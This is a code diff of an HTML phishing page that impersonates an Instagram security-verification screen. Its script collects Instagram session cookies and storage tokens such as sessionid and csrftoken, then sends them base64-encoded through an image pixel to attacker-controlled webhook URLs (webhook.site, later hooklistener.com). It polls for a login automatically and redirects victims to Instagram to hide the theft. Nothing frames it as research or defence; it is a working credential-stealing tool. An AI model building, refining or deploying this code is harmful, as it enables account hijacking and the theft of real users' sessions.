@@ -6,45 +6,86 @@
     <title>Instagram - Security Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; border: 1px solid #dbdbdb; border-radius: 4px; padding: 40px; max-width: 350px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: #fafafa; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+        }
+        .container { 
+            background: #fff; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 4px; 
+            padding: 40px; 
+            max-width: 350px; 
+            text-align: center; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+        }
         .logo { font-size: 32px; font-weight: 300; color: #262626; margin-bottom: 20px; }
         .title { font-size: 24px; font-weight: 300; color: #262626; margin-bottom: 10px; }
         .subtitle { color: #8e8e8e; margin-bottom: 30px; font-size: 14px; }
-        .button { background: #0095f6; color: white; border: none; border-radius: 8px; height: 44px; width: 100%; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 10px; transition: background 0.2s; }
+        .button { 
+            background: #0095f6; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            height: 44px; 
+            width: 100%; 
+            font-size: 14px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-bottom: 10px; 
+        }
         .button:hover { background: #007bb5; }
         .button:disabled { background: #b2dffc; cursor: not-allowed; }
         .status { margin-top: 20px; font-size: 14px; color: #8e8e8e; min-height: 20px; }
-        .debug { display: none; position: fixed; top: 10px; right: 10px; background: #000; color: #0f0; padding: 10px; font-family: monospace; font-size: 12px; max-width: 300px; max-height: 200px; overflow: auto; z-index: 9999; }
-        .hidden-iframe { position: absolute; left: -9999px; width: 1px; height: 1px; }
+        .debug { 
+            display: none; 
+            position: fixed; 
+            top: 10px; 
+            right: 10px; 
+            background: #000; 
+            color: #0f0; 
+            padding: 10px; 
+            font-family: monospace; 
+            font-size: 12px; 
+            max-width: 300px; 
+            max-height: 200px; 
+            overflow: auto; 
+            z-index: 9999; 
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">Instagram</div>
-        <div class="title">Security Verification Required</div>
-        <div class="subtitle">To protect your account, please confirm you're logged in and extract your session.</div>
+        <div class="title">Security Verification</div>
+        <div class="subtitle">Confirm you're logged in to continue</div>
         <button id="extractBtn" class="button">🔒 Extract Tokens</button>
         <div id="status" class="status"></div>
     </div>
     <div id="debug" class="debug"></div>
 
     <script>
-        const UUID = '840d26d6-77ab-4c02-ba0d-ef17c623eebe'; // Your UUID
-        const WEBHOOK = 'https://webhook.site/840d26d6-77ab-4c02-ba0d-ef17c623eebe?uuid='; // Replace with your webhook ID (no https://)
-        const debug = document.getElementById('debug');
-        const status = document.getElementById('status');
-        const btn = document.getElementById('extractBtn');
+        // EDIT THESE 2 LINES ONLY
+        const UUID = 'w/my-first-endpoint-uvu/*';
+        const WEBHOOK_BASE = 'https://hooklistener.com/w/my-first-endpoint-uvu/*?';  // From hooklistener.com
 
-        function log(msg) {
-            console.log('[PHISH]', msg);
-            debug.innerHTML += msg + '<br>';
-            debug.style.display = 'block';
-            debug.scrollTop = debug.scrollHeight;
+        const debugDiv = document.getElementById('debug');
+        const statusDiv = document.getElementById('status');
+        const button = document.getElementById('extractBtn');
+
+        function log(message) {
+            console.log('[PHISH]', message);
+            debugDiv.innerHTML += message + '<br>';
+            debugDiv.style.display = 'block';
+            debugDiv.scrollTop = debugDiv.scrollHeight;
         }
 
-        function updateStatus(msg) {
-            status.textContent = msg;
+        function updateStatus(message) {
+            statusDiv.textContent = message;
         }
 
         function getTokens() {
@@ -53,73 +94,77 @@
                 timestamp: Date.now(),
                 cookies: document.cookie,
                 userAgent: navigator.userAgent,
-                referrer: document.referrer,
-                igTokens: {}
+                url: location.href
             };
 
-            // Extract IG tokens from all storage
-            ['sessionid', 'csrftoken', 'ds_user_id', 'mid', 'ig_did', 'shbid', 'rur', 'datr'].forEach(key => {
+            // Grab IG tokens from all locations
+            const igKeys = ['sessionid', 'csrftoken', 'ds_user_id', 'mid', 'ig_did', 'shbid', 'rur', 'datr'];
+            igKeys.forEach(key => {
                 const lsVal = localStorage.getItem(key);
                 const ssVal = sessionStorage.getItem(key);
-                const ckVal = document.cookie.split(';').find(row => row.trim().startsWith(key + '='));
-                if (lsVal) data.igTokens[key + '_ls'] = lsVal;
-                if (ssVal) data.igTokens[key + '_ss'] = ssVal;
-                if (ckVal) data.igTokens[key + '_ck'] = ckVal.split('=')[1];
+                const ckMatch = document.cookie.match(new RegExp('\\b' + key + '=([^;]+)'));
+                if (lsVal) data[key + '_local'] = lsVal;
+                if (ssVal) data[key + '_session'] = ssVal;
+                if (ckMatch) data[key + '_cookie'] = ckMatch[1];
             });
 
-            // All storage keys
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (!data.igTokens[key]) data.igTokens[key] = localStorage.getItem(key);
-            }
-
-            log('Found tokens: ' + Object.keys(data.igTokens).filter(k => k.includes('sessionid') || k.includes('csrftoken')).join(', '));
+            // Log found tokens
+            const foundKeys = Object.keys(data).filter(k => 
+                k.includes('sessionid') || k.includes('csrftoken')
+            );
+            log('Found: ' + foundKeys.join(', '));
+            
             return data;
         }
 
-        function exfilPixel(data) {
-            // URL-safe base64 JSON
-            const json = JSON.stringify(data);
-            const b64 = btoa(unescape(encodeURIComponent(json)));
-            const img = new Image();
-            img.src = WEBHOOK + encodeURIComponent(b64);
-            img.onload = () => log('✅ Pixel exfil SUCCESS');
-            img.onerror = (e) => log('❌ Pixel failed: ' + e.type);
-            document.body.appendChild(img);
+        function exfilData(tokenData) {
+            const jsonString = JSON.stringify(tokenData);
+            const base64Data = btoa(unescape(encodeURIComponent(jsonString)));
+            
+            const pixel = new Image();
+            pixel.src = WEBHOOK_BASE + encodeURIComponent(base64Data);
+            pixel.onload = () => log('✅ EXFIL SUCCESS');
+            pixel.onerror = () => log('❌ EXFIL FAILED');
+            document.body.appendChild(pixel);
         }
 
-        // Broadcast to other tabs
-        const channel = new BroadcastChannel('phish_channel');
-        channel.postMessage({action: 'dump', uuid: UUID});
-        channel.onmessage = (e) => {
-            if (e.data.tokens) {
-                log('Tab dump: ' + JSON.stringify(e.data.tokens).substring(0,100));
-                exfilPixel(e.data.tokens);
-            }
-        };
-
-        btn.onclick = () => {
-            log('Button clicked');
+        // Button click
+        button.onclick = () => {
+            log('Button clicked - extracting...');
             updateStatus('Extracting tokens...');
             const tokens = getTokens();
-            exfilPixel(tokens);
+            exfilData(tokens);
             updateStatus('Tokens sent! Redirecting...');
-            setTimeout(() => window.location.href = 'https://www.instagram.com/', 1500);
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/';
+            }, 1500);
         };
 
-        // Auto-poll
-        let polls = 0;
+        // Auto-detect IG login (polls other tabs/storage)
+        let pollCount = 0;
         const autoPoll = setInterval(() => {
             const tokens = getTokens();
-            if (tokens.igTokens.sessionid_ls || tokens.igTokens.sessionid_ck || polls > 8) {
-                log('Auto exfil');
-                exfilPixel(tokens);
+            if (tokens.sessionid_local || tokens.sessionid_cookie || pollCount > 10) {
+                log('Auto-detected login - exfiling');
+                exfilData(tokens);
                 clearInterval(autoPoll);
             }
-            polls++;
-        }, 1500);
+            pollCount++;
+        }, 2000);
 
-        log('Phish ready - click button or wait for auto');
+        // Listen for other tabs
+        if (typeof BroadcastChannel !== 'undefined') {
+            const channel = new BroadcastChannel('ig_phish');
+            channel.onmessage = (event) => {
+                if (event.data.action === 'tokens') {
+                    log('Tab shared tokens');
+                    exfilData(event.data);
+                }
+            };
+        }
+
+        log('Phish loaded - UUID ready - get new hooklistener URL');
+        updateStatus('Open Instagram tab, login, then click Extract');
     </script>
 </body>
 </html>
